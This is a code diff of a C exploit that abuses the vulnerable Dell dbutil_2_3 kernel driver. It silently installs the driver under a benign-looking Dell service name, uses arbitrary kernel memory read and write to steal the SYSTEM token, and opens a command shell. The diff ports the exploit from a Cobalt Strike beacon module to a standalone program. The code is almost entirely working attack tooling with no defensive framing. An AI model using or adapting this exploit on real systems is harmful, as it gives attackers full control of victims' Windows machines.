@@ -88,6 +88,14 @@
 #include <winternl.h>
 
 /**
+ * Shell Object
+ * 
+ * Contains legacy Windows environment features, the Windows shell and Windows controls.
+ * https://learn.microsoft.com/en-us/windows/win32/api/shlobj/
+ */
+#include <shlobj.h>
+
+/**
  * Custom definitions
  */
 #define SystemModuleInformation         0x0B
@@ -101,6 +109,56 @@
 #include "headers/structs.h"
 #include "headers/imports.h"
 #include "headers/beacon.h"
+
+/**
+ * If debug is enabled
+ */
+#ifndef DEBUG
+    #define DEBUG 1
+#endif
+
+/**
+ * Define cross-compatible print methods
+ */
+#ifdef BOF
+    #define PRINT(...) { \
+        PRINT_DEBUG(__VA_ARGS__); \
+    }
+#else
+    #define PRINT(...) { \
+        fprintf(stdout, "[+] "); \
+        fprintf(stdout, __VA_ARGS__); \
+        fprintf(stdout, "\n"); \
+    }
+#endif
+
+#ifdef BOF
+    #define PRINT_ERROR(...) { \
+        BeaconPrintf(CALLBACK_ERROR, __VA_ARGS__); \
+    }
+#else
+    #define PRINT_ERROR(...) { \
+        fprintf(stdout, "[!] "); \
+        fprintf(stdout, __VA_ARGS__); \
+        fprintf(stdout, "\n"); \
+    }
+#endif
+
+#ifdef BOF
+    #define PRINT_DEBUG(...) { \
+        if (DEBUG) { \
+            BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
+        } \
+    }
+#else
+    #define PRINT_DEBUG(...) { \
+        if (DEBUG) { \
+            fprintf(stdout, "[i] "); \
+            fprintf(stdout, __VA_ARGS__); \
+            fprintf(stdout, "\n"); \
+        } \
+    }
+#endif
 
 /**
  * The vulnerable driver in hexadecimal.
@@ -117,36 +175,36 @@ uint64_t driverFileSize = 14840;
 LPVOID getKernelBase() {
     DWORD dwSize = 0;
 
-    if (NTDLL$NtQuerySystemInformation(SystemModuleInformation, NULL, dwSize, &dwSize) != STATUS_INFO_LENGTH_MISMATCH) {
-        BeaconPrintf(CALLBACK_ERROR, "Cannot get length of system module list array.");
+    if (NtQuerySystemInformation(SystemModuleInformation, NULL, dwSize, &dwSize) != STATUS_INFO_LENGTH_MISMATCH) {
+        PRINT_ERROR("Cannot get length of system module list array.");
         return NULL;
     }
   
-    PRTL_PROCESS_MODULES pSystemModules = (PRTL_PROCESS_MODULES) KERNEL32$GlobalAlloc(GMEM_ZEROINIT, dwSize);
+    PRTL_PROCESS_MODULES pSystemModules = (PRTL_PROCESS_MODULES) GlobalAlloc(GMEM_ZEROINIT, dwSize);
     
     if (!pSystemModules) {
-        BeaconPrintf(CALLBACK_ERROR, "Cannot allocate memory for system module list.");
+        PRINT_ERROR("Cannot allocate memory for system module list.");
         return NULL;
     }
 
-    if (!NT_SUCCESS(NTDLL$NtQuerySystemInformation(SystemModuleInformation, pSystemModules, dwSize, &dwSize))) {
-        BeaconPrintf(CALLBACK_ERROR, "Cannot get system module list.");
-        KERNEL32$GlobalFree(pSystemModules);
+    if (!NT_SUCCESS(NtQuerySystemInformation(SystemModuleInformation, pSystemModules, dwSize, &dwSize))) {
+        PRINT_ERROR("Cannot get system module list.");
+        GlobalFree(pSystemModules);
         return NULL;
     }
 
     DWORD dwCount = pSystemModules->NumberOfModules;
     
     for (DWORD i = 0; i < dwCount; i++) {
-        if (MSVCRT$strstr((char*) pSystemModules->Modules[i].FullPathName, "ntoskrnl.exe")) {
+        if (strstr((char*) pSystemModules->Modules[i].FullPathName, "ntoskrnl.exe")) {
             PCHAR pBase = (PCHAR) pSystemModules->Modules[i].ImageBase;
-            KERNEL32$GlobalFree(pSystemModules);
+            GlobalFree(pSystemModules);
             return pBase;
         }
     }
 
-    BeaconPrintf(CALLBACK_ERROR, "Cannot find ntoskrnl.exe in system module list. This should not happen.");
-    KERNEL32$GlobalFree(pSystemModules);
+    PRINT_ERROR("Cannot find ntoskrnl.exe in system module list. This should not happen.");
+    GlobalFree(pSystemModules);
     return NULL;
 }
 
@@ -156,13 +214,13 @@ LPVOID getKernelBase() {
  * @return bool Positive if it is installed.
  */
 bool isVulnerableDriverInstalled() {
-    HANDLE hDevice = KERNEL32$CreateFileW(L"\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hDevice = CreateFileW(L"\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
     if (hDevice == INVALID_HANDLE_VALUE) {
         return false;
     }
 
-    KERNEL32$CloseHandle(hDevice);
+    CloseHandle(hDevice);
     return true;
 }
 
@@ -173,22 +231,22 @@ bool isVulnerableDriverInstalled() {
  * @return bool Positive if it was succesfully written.
  */
 bool dropServiceBinary(wchar_t* driverPath) {   
-    HANDLE hFile = KERNEL32$CreateFileW(driverPath, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = CreateFileW(driverPath, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "Cannot open given file handle: %S.", driverPath);
+        PRINT_ERROR("Cannot open given file handle: %S.", driverPath);
         return false;
     } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "Opened file handle to: %S.", driverPath);
+        PRINT_DEBUG("Opened file handle to: %S.", driverPath);
     }
 
-    if(!KERNEL32$WriteFile(hFile, driverFile, driverFileSize, NULL, NULL)) {
-        BeaconPrintf(CALLBACK_ERROR, "Cannot write to file handle: %S.", driverPath);
+    if(!WriteFile(hFile, driverFile, driverFileSize, NULL, NULL)) {
+        PRINT_ERROR("Cannot write to file handle: %S.", driverPath);
         return false;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "Wrote driver as file: %S.", driverPath);
+    PRINT_DEBUG("Wrote driver as file: %S.", driverPath);
 
-    KERNEL32$CloseHandle(hFile);
+    CloseHandle(hFile);
     return true;
 }
 
@@ -201,37 +259,37 @@ bool dropServiceBinary(wchar_t* driverPath) {
 bool deleteService(char* serviceName) {
     // Establishes a connection to the service control manager.
     SC_HANDLE hServiceManager;
-    if (!(hServiceManager = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT))) {
-        BeaconPrintf(CALLBACK_ERROR, "Cannot open handle to the service manager.");
+    if (!(hServiceManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT))) {
+        PRINT_ERROR("Cannot open handle to the service manager.");
         return false;
     }
 
     // Open service (if possible)
-    SC_HANDLE hService = ADVAPI32$OpenServiceW(hServiceManager, serviceName, SERVICE_STOP);
+    SC_HANDLE hService = OpenServiceW(hServiceManager, serviceName, SERVICE_STOP);
     if (hService == NULL) {
-        BeaconPrintf(CALLBACK_ERROR, "Service not installed: %d.", KERNEL32$GetLastError());
-        ADVAPI32$CloseServiceHandle(hServiceManager);
+        PRINT_ERROR("Service not installed: %d.", GetLastError());
+        CloseServiceHandle(hServiceManager);
         return false;
     }
 
     // Stop the service
     DWORD serviceStatus;
-    if (!ADVAPI32$ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
-        BeaconPrintf(CALLBACK_ERROR, "Could not stop service: %d, %d.", KERNEL32$GetLastError(), serviceStatus);
-        ADVAPI32$CloseServiceHandle(hService);
-        ADVAPI32$CloseServiceHandle(hServiceManager);
+    if (!ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
+        PRINT_ERROR("Could not stop service: %d, %d.", GetLastError(), serviceStatus);
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hServiceManager);
         return false;
     }
 
     // Delete the service
-    if (!ADVAPI32$DeleteService(hService)) {
-        BeaconPrintf(CALLBACK_ERROR, "Could not delete service.");
-        ADVAPI32$CloseServiceHandle(hService);
-        ADVAPI32$CloseServiceHandle(hServiceManager);
+    if (!DeleteService(hService)) {
+        PRINT_ERROR("Could not delete service.");
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hServiceManager);
     }
 
-    ADVAPI32$CloseServiceHandle(hService);
-    ADVAPI32$CloseServiceHandle(hServiceManager);
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hServiceManager);
     return true;
 }
 
@@ -242,8 +300,8 @@ bool deleteService(char* serviceName) {
  * @return bool Positive if it was succesfully deleted.
  */
 bool deleteServiceBinary(wchar_t* driverPath) {
-    if(!KERNEL32$DeleteFileW(driverFile)) {
-        BeaconPrintf(CALLBACK_ERROR, "Cannot delete the file: %S.", driverPath);
+    if(!DeleteFileW(driverFile)) {
+        PRINT_ERROR("Cannot delete the file: %S.", driverPath);
         return false;
     }
 
@@ -261,41 +319,41 @@ bool deleteServiceBinary(wchar_t* driverPath) {
 bool installService(wchar_t* serviceName, wchar_t* serviceDescription, wchar_t* driverPath) {
     // Establishes a connection to the service control manager.
     SC_HANDLE hServiceManager;
-    if (!(hServiceManager = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))) {
-        BeaconPrintf(CALLBACK_ERROR, "Cannot open handle to the service manager.");
+    if (!(hServiceManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))) {
+        PRINT_ERROR("Cannot open handle to the service manager.");
         return false;
     }
 
     // Ignore if the service is already installed
     SC_HANDLE hServiceCheck;
-    if (hServiceCheck = ADVAPI32$OpenServiceW(hServiceManager, serviceName, SERVICE_START)) {
-        BeaconPrintf(CALLBACK_ERROR, "Service already installed.");
-        ADVAPI32$CloseServiceHandle(hServiceCheck);
-        ADVAPI32$CloseServiceHandle(hServiceManager);
+    if (hServiceCheck = OpenServiceW(hServiceManager, serviceName, SERVICE_START)) {
+        PRINT_ERROR("Service already installed.");
+        CloseServiceHandle(hServiceCheck);
+        CloseServiceHandle(hServiceManager);
         return true;
     }
 
     // Create the service with the vulnerable driver
     SC_HANDLE hService;
-    if (!(hService = ADVAPI32$CreateServiceW(hServiceManager, serviceName, serviceDescription, READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, driverPath, NULL, NULL, NULL, NULL, NULL))) {
-        BeaconPrintf(CALLBACK_ERROR, "Could not install the vulnerable service: %d.", KERNEL32$GetLastError());
-        ADVAPI32$CloseServiceHandle(hServiceManager);
+    if (!(hService = CreateServiceW(hServiceManager, serviceName, serviceDescription, READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, driverPath, NULL, NULL, NULL, NULL, NULL))) {
+        PRINT_ERROR("Could not install the vulnerable service: %d.", GetLastError());
+        CloseServiceHandle(hServiceManager);
         return false;
     }
 
     // Start the installed service
-    if (!ADVAPI32$StartServiceW(hService, 0, NULL)) {
-        if (KERNEL32$GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
-            BeaconPrintf(CALLBACK_ERROR, "Could not start the vulnerable service: %d.", KERNEL32$GetLastError());
-            ADVAPI32$CloseServiceHandle(hService);
-            ADVAPI32$CloseServiceHandle(hServiceManager);
+    if (!StartServiceW(hService, 0, NULL)) {
+        if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
+            PRINT_ERROR("Could not start the vulnerable service: %d.", GetLastError());
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hServiceManager);
             return false;
         }
     }
 
     // Close existing connections
-    ADVAPI32$CloseServiceHandle(hService);
-    ADVAPI32$CloseServiceHandle(hServiceManager);
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hServiceManager);
 
     return true;
 }
@@ -314,8 +372,8 @@ uint8_t* memoryRead(HANDLE hDevice, uint8_t* address) {
     lpBuffer.address = address;
     lpBuffer.offset = 0;
 
-    if (!KERNEL32$DeviceIoControl(hDevice, ARBITRARY_READ_IOCTL, &lpBuffer, sizeof(lpBuffer), &lpBuffer, sizeof(lpBuffer), &lpBytesReturned, NULL)) {
-        BeaconPrintf(CALLBACK_ERROR, "DeviceIoControl error in 'memoryRead'.");
+    if (!DeviceIoControl(hDevice, ARBITRARY_READ_IOCTL, &lpBuffer, sizeof(lpBuffer), &lpBuffer, sizeof(lpBuffer), &lpBytesReturned, NULL)) {
+        PRINT_ERROR("DeviceIoControl error in 'memoryRead'.");
     }
     
     return lpBuffer.value;
@@ -337,93 +395,92 @@ void memoryWrite(HANDLE hDevice, uint8_t* address, uint8_t* value) {
     lpBuffer.offset = 0;
     lpBuffer.value = value;
 
-    if (!KERNEL32$DeviceIoControl(hDevice, ARBITRARY_WRITE_IOCTL, &lpBuffer, sizeof(lpBuffer), &lpBuffer, sizeof(lpBuffer), &lpBytesReturned, NULL)) {
-        BeaconPrintf(CALLBACK_ERROR, "DeviceIoControl error in 'memoryWrite'.");
+    if (!DeviceIoControl(hDevice, ARBITRARY_WRITE_IOCTL, &lpBuffer, sizeof(lpBuffer), &lpBuffer, sizeof(lpBuffer), &lpBytesReturned, NULL)) {
+        PRINT_ERROR("DeviceIoControl error in 'memoryWrite'.");
     }
 }
 
 /**
- * CS BOF entry point.
- * 
- * The Cobalt Strike (CS) Beacon Object File (BOF) entry point.
- * 
- * @param char* args The array of arguments.
- * @param int length The length of the array of arguments.
+ * Perform the kernel exploit & elavation.
  */
-void go(char* args, int length) {
+void boot() {
     wchar_t* SERVICE_NAME = L"dbutil_2_3";
     wchar_t* SERVICE_DESC = L"Dell Client Platform";
     wchar_t* SERVICE_PATH = L"C:\\windows\\system32\\drivers\\dbutil_2_3.sys";
 
-    BeaconPrintf(CALLBACK_OUTPUT, "Identifying if vulnerable kernel driver is installed.");
+    PRINT_DEBUG("Identifying if vulnerable kernel driver is installed.");
     bool isInitialyVulnerable = isVulnerableDriverInstalled();
 
-    if (!isInitialyVulnerable && !BeaconIsAdmin()) {
-        BeaconPrintf(CALLBACK_ERROR, "The vulnerable kernel driver is not installed, and you're not running elevated.");
+    if (!isInitialyVulnerable && !IsUserAnAdmin()) {
+        PRINT_ERROR("The vulnerable kernel driver is not installed, and you're not running elevated.");
         return;
     }
 
     if (!isInitialyVulnerable) {
-        BeaconPrintf(CALLBACK_OUTPUT, "Dropping vulnerable kernel driver to disk.");
+        PRINT_DEBUG("Dropping vulnerable kernel driver to disk.");
         dropServiceBinary(SERVICE_PATH);
 
-        BeaconPrintf(CALLBACK_OUTPUT, "Installing vulnerable kernel driver.");
+        PRINT_DEBUG("Installing vulnerable kernel driver.");
         if (!installService(SERVICE_NAME, SERVICE_DESC, SERVICE_PATH)) {
-            BeaconPrintf(CALLBACK_ERROR, "Could not install vulnerable kernel driver.");
+            PRINT_ERROR("Could not install vulnerable kernel driver.");
             return;
         } else {
-            BeaconPrintf(CALLBACK_OUTPUT, "Installed vulnerable kernel driver successfully.");
+            PRINT_DEBUG("Installed vulnerable kernel driver successfully.");
         }
     }
 
-    HANDLE hDevice = KERNEL32$CreateFileW(L"\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hDevice = CreateFileW(L"\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hDevice == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to open handle to kernel driver.");
+        PRINT_ERROR("Failed to open handle to kernel driver.");
         return;
     }
 
-    HMODULE hNtOsKrnl = KERNEL32$LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
+    HMODULE hNtOsKrnl = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
     if (!hNtOsKrnl) {
-        BeaconPrintf(CALLBACK_ERROR, "Cannot load 'ntoskrnl.exe'.");
-        KERNEL32$CloseHandle(hDevice);
+        PRINT_ERROR("Cannot load 'ntoskrnl.exe'.");
+        CloseHandle(hDevice);
         return;
     }
 
-    size_t systemProcessOffset = (uint8_t*) ((size_t) KERNEL32$GetProcAddress(hNtOsKrnl, "PsInitialSystemProcess") - (size_t) hNtOsKrnl);
-    BeaconPrintf(CALLBACK_OUTPUT, "Identified 'PsInitialSystemProcess' at 0x%x.", systemProcessOffset);
+    size_t systemProcessOffset = (uint8_t*) ((size_t) GetProcAddress(hNtOsKrnl, "PsInitialSystemProcess") - (size_t) hNtOsKrnl);
+    PRINT_DEBUG("Identified 'PsInitialSystemProcess' at 0x%x.", systemProcessOffset);
 
     size_t kernelBase = (size_t) getKernelBase();
     if (!kernelBase) {
-        BeaconPrintf(CALLBACK_ERROR, "Kernel base not correctly identified.");
+        PRINT_ERROR("Kernel base not correctly identified.");
         return;
     } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "Identified 'ntoskrnl.exe' base address at 0x%x.", kernelBase);
+        PRINT_DEBUG("Identified 'ntoskrnl.exe' base address at 0x%x.", kernelBase);
     }
 
     uint8_t* systemProcessPointerAddress = (uint8_t*) ((size_t) kernelBase + systemProcessOffset);
-    BeaconPrintf(CALLBACK_OUTPUT, "Identified system process pointer address at %p.", systemProcessPointerAddress);
+    PRINT_DEBUG("Identified system process pointer address at %p.", systemProcessPointerAddress);
 
     uint8_t* systemProcessAddress = memoryRead(hDevice, systemProcessPointerAddress);
-    BeaconPrintf(CALLBACK_OUTPUT, "Identified system process address at %p.", systemProcessAddress);
+    PRINT_DEBUG("Identified system process address at %p.", systemProcessAddress);
 
     uint8_t* systemProcessToken = (uint8_t*) ((size_t) memoryRead(hDevice, systemProcessAddress + 0x4b8) & 0xfffffffffffffff0);
-    BeaconPrintf(CALLBACK_OUTPUT, "Identified system process token at %p.", systemProcessToken);
+    PRINT_DEBUG("Identified system process token at %p.", systemProcessToken);
 
     uint8_t* activeProcessLinks = memoryRead(hDevice, systemProcessAddress + 0x448);
-    BeaconPrintf(CALLBACK_OUTPUT, "Identified active process links at %p.", activeProcessLinks);
+    PRINT_DEBUG("Identified active process links at %p.", activeProcessLinks);
 
     while (true) {
-        if (memoryRead(hDevice, activeProcessLinks - 8) == KERNEL32$GetCurrentProcessId()) {
+        if (memoryRead(hDevice, activeProcessLinks - 8) == GetCurrentProcessId()) {
             uint8_t* currentProcess = activeProcessLinks - 0x448;
-            BeaconPrintf(CALLBACK_OUTPUT, "Found current process (beacon) at %p.", currentProcess);
+            PRINT_DEBUG("Found current process (beacon) at %p.", currentProcess);
             memoryWrite(hDevice, currentProcess + 0x4b8, systemProcessToken);
-            BeaconPrintf(CALLBACK_OUTPUT, "Setting current process (beacon) token to system process token.");
-            BeaconPrintf(CALLBACK_OUTPUT, "Exploit executed successfully! You are now SYSTEM.");
+            PRINT_DEBUG("Setting current process (beacon) token to system process token.");
+            PRINT_DEBUG("Exploit executed successfully! You are now SYSTEM.");
             break;
         }
 
         activeProcessLinks = memoryRead(hDevice, activeProcessLinks);
     }
+
+#ifndef BOF
+    system("cmd");
+#endif
 
     if (!isInitialyVulnerable) {
         // TODO: Identify how we can stop a running kernel driver without reboot
@@ -431,5 +488,29 @@ void go(char* args, int length) {
         //deleteServiceBinary(SERVICE_PATH);
     }
 
-    KERNEL32$CloseHandle(hDevice);
+    CloseHandle(hDevice);
 }
+
+#ifdef BOF
+    /**
+     * CS BOF entry point.
+     * 
+     * The Cobalt Strike (CS) Beacon Object File (BOF) entry point.
+     * 
+     * @param char* args The array of arguments.
+     * @param int length The length of the array of arguments.
+     */
+    void go(char* args, int length) {
+        boot();
+    }
+#else
+    /**
+     * Test the kernel exploit & elavation code
+     *
+     * @param int argc Amount of arguments in argv.
+     * @param char** Array of arguments passed to the program.
+     */
+    void main(int argc, char** argv) {
+        boot();
+    }
+#endif
